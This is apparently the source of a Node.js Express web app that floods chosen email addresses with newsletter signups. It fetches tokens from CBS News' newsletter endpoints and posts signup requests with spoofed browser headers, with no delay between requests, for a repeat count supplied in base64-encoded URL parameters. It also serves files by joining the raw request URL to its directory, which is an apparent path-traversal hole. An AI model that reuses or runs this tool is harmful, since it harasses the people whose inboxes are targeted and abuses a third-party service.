const express = require("express");
const axios = require("axios");
const path = require("path");
const {v4: uuidv4} = require("uuid"); // for generating unique session IDs

const app = express();
let stopFlag = false;

function removeElementFromArray(array, elementToRemove) {
    const index = array.indexOf(elementToRemove);
    if (index !== -1) {
        array.splice(index, 1);
    }
    return array;
}

const sessions = {}; // To store data for each session

async function spam(sessionId, theemail) {
    if (stopFlag) {
        console.log("Spam operation stopped.");
        return;
    }

    try {

        const tokenResponse = await axios.get("https://www.cbsnews.com/newsletters/xhr/token");
        const token = tokenResponse.data.token;
        const response = await axios.post(
            'https://www.cbsnews.com/newsletters/xhr/signup',
            `{"email":"${theemail}","sub":"m40186,m40183","token":"${token}","mCodeOptin":"m40183"}`, {
                headers: {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'text/plain',
                    'dnt': '1',
                    'origin': 'https://www.cbsnews.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
                }
            }
        );

        sessions[sessionId].num++;
        // console.log(response.data);
    } catch (e) {
        if (sessions[sessionId]) {
            sessions[sessionId].errs++;
            sessions[sessionId].errorMessages.push(e.message);
        } else {
            console.log("ERROR: session " + sessionId + " not found. User probably clicked stop button.");
        }
    }
}

function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
    let emailIndex = 0;
    let spamCount = 0;
    const totalSpams = emails.length * emailsToSpam;

    const intervalId = setInterval(() => {
        if (stopFlag || spamCount >= totalSpams) {
            clearInterval(intervalId);
            console.log("All emails processed.");
            return;
        }

        const email = emails[emailIndex];
        spam(sessionId, email).then(() => {
            spamCount++;
            emailIndex = (emailIndex + 1) % emails.length;
        });
    }, interval);
}

app.use(express.static("static"));
app.use((req, res, next) => {
    const {
        headers: {
            cookie
        },
    } = req;
    if (cookie) {
        const values = cookie.split(";").reduce((res, item) => {
            const data = item.trim().split("=");
            return {
                ...res,
                [data[0]]: data[1]
            };
        }, {});
        res.locals.cookie = values;
    } else res.locals.cookie = {};
    next();
});

app.get("/sendMail/:id1/:id2/index.html", (req, res) => {
    try {
        const sessionId = uuidv4(); // Generate a unique session ID
        sessions[sessionId] = {
            num: 0,
            errs: 0,
            errorMessages: []
        }; // Initialize session data

        const id1 = Buffer.from(req.params.id1, "base64").toString("utf-8");
        const id2 = Buffer.from(req.params.id2, "base64").toString("utf-8");
        const emails = id1.split(",");
        const emailCount = emails.length;
        const emailsToSpam = Number(id2);

        // Define interval in milliseconds
        const interval = 0; // Example: 1000ms = 1 second

        // Execute the spam function without waiting for it
        executeSpam(sessionId, emails, emailCount, emailsToSpam, interval);

        res.cookie("sessionId", sessionId, {
            httpOnly: true
        }); // Store session ID in a cookie
        res.sendFile(path.join(__dirname, "spamPages", "spam.html"));
    } catch (e) {
        res.status(500).send(
            "Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" +
            e,
        );
    }
});

app.get("/sendMail/:id1/:id2/:id3", (req, res) => {
    try {
        res.sendFile(path.join(__dirname, req.url));
    } catch (e) {
        res.status(500).send("ERROR: " + e.message);
    }
});

// Endpoint to stop the spam operation
app.post("/stopSpam", (req, res) => {
    stopFlag = true;
    res.send("Spam operation stopped.");
});

app.post("/cleanUp", (req, res) => {
    const sessionId = res.locals.cookie.sessionId;
    if (sessions[sessionId]) {
        delete sessions[sessionId];
    }
    res.clearCookie("sessionId");
    res.send("Cleared session data.");
});

app.get("/num.txt", (req, res) => {
    const sessionId = res.locals.cookie.sessionId; // Retrieve session ID from cookie
    if (sessions[sessionId]) {
        res.send(sessions[sessionId].num.toString());
    } else {
        res.status(404).send("Session not found");
    }
});

app.get("/errs.txt", (req, res) => {
    const sessionId = res.locals.cookie.sessionId;
    if (sessions[sessionId]) {
        res.send(sessions[sessionId].errs.toString());
    } else {
        res.status(404).send("Session not found");
    }
});

app.get("/errmessages.txt", (req, res) => {
    const sessionId = res.locals.cookie.sessionId;
    if (sessions[sessionId]) {
        res.send(sessions[sessionId].errorMessages.join("\n"));
    } else {
        res.status(404).send("Session not found");
    }
});

app.listen(8080, () => {
    console.log("Server is running on port 8080");
});
